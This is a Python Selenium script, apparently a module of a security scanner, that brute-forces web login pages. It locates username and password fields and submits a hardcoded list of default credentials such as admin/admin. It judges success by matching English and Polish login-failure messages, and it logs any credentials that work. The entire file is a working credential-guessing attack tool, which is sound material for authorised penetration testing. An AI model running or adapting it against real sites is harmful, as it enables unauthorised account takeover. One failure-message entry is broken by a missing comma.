import logging
from re import search
from typing import Optional

# disable in config
from selenium import webdriver  # type: ignore
from selenium.common.exceptions import NoSuchElementException  # type: ignore
from selenium.webdriver.chrome.service import Service  # type: ignore
from selenium.webdriver.chrome.webdriver import WebDriver  # type: ignore
from selenium.webdriver.common.by import By  # type: ignore
from selenium.webdriver.common.keys import Keys  # type: ignore
from selenium.webdriver.remote.webelement import WebElement  # type: ignore
from selenium.webdriver.support import expected_conditions as ec  # type: ignore
from selenium.webdriver.support.ui import WebDriverWait  # type: ignore

logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)
handler = logging.StreamHandler()
handler.setLevel(logging.INFO)
logger.addHandler(handler)


class LoginBruter:
    BRUTE_CREDENTIALS = [
        ("admin", "admin"),
        ("admin", "password"),
        ("user", "password"),
        ("djangouser", "password"),
        ("b", "b"),
    ]

    LOGIN_FAILED_MSGS = [
        "Please enter the correct username and password for a staff account. "
        "Note that both fields may be case-sensitive.",
        "Unrecognized username or password. Forgot your password?",
        "Username and password do not match or you do not have an account yet.",
        # common keywords
        "credentials",
        "Invalid credentials",
        "username or password",
        "Username or password",
        "username and/or password",
        "username and password",
        "użytkownik lub hasło",
        "Użytkownik lub hasło",
        "użytkownik i hasło",
        "Użytkownik i hasło",
        "dane logowania",
        "Login i / lub hasło" "niepoprawne",
    ]

    def brute(self, url: str) -> None:
        for username, password in self.BRUTE_CREDENTIALS:
            driver = LoginBruter._get_webdriver()
            driver.get(url)
            WebDriverWait(driver, 10).until(ec.url_matches(url))
            try:
                user_input, password_input = LoginBruter._find_form_inputs(url, driver)
            except TypeError:
                driver.close()
                driver.quit()
                break
            driver.implicitly_wait(10)
            LoginBruter._send_credentials(
                user_input=user_input,
                password_input=password_input,
                username=username,
                password=password,
            )
            driver.implicitly_wait(10)
            result = LoginBruter._get_logging_in_result(driver, self.LOGIN_FAILED_MSGS)
            driver.implicitly_wait(10)
            if result is None:
                logger.error("The result of the login attempt could not be confirmed.")
            elif not result:
                logger.info(f"Logging in successful with credentials: {username}, {password}")
                # break
            else:
                continue
            driver.close()
            driver.quit()

    @staticmethod
    def _get_webdriver() -> WebDriver:
        service = Service(executable_path="./chromedriver-linux64/chromedriver")
        return webdriver.Chrome(service=service)

    @staticmethod
    def _find_form_inputs(url: str, driver: WebDriver) -> Optional[tuple[WebElement, WebElement]]:
        user_input, password_input = None, None
        inputs = driver.find_elements(By.TAG_NAME, "input")
        if not inputs:
            logging.error(f"Login form has not been found on {url}")
            return None
        else:
            for field in inputs:
                if field.get_attribute("type") == "text":
                    tag_values = driver.execute_script(
                        "var items = []; for (index = 0; index < arguments[0].attributes.length; ++index)"
                        "items.push(arguments[0].attributes[index].value); return items;",
                        field,
                    )
                    for value in tag_values:
                        if search(r"[Uu]ser", value) or search(r"[Ll]ogin", value) or search(r"[Nn]ame", value):
                            user_input = field
                            break
                elif field.get_attribute("type") == "password":
                    password_input = field
        if not password_input or not user_input:
            logging.error(f"Login form has not been found on {url}")
            return None
        return user_input, password_input

    @staticmethod
    def _send_credentials(user_input: WebElement, password_input: WebElement, username: str, password: str) -> None:
        if user_input:
            user_input.send_keys(username)
        if password_input:
            password_input.send_keys(password)
            password_input.send_keys(Keys.ENTER)

    @staticmethod
    def _get_logging_in_result(driver: WebDriver, login_failure_msgs: list[str]) -> Optional[list[str]]:
        try:
            web_content = driver.find_element(By.XPATH, "html/body").text
            driver.implicitly_wait(10)
            result = [msg for msg in login_failure_msgs if (msg in web_content)]
            return result
        except NoSuchElementException:
            return None


if __name__ == "__main__":
    bruter = LoginBruter()
    bruter.brute("example-url")
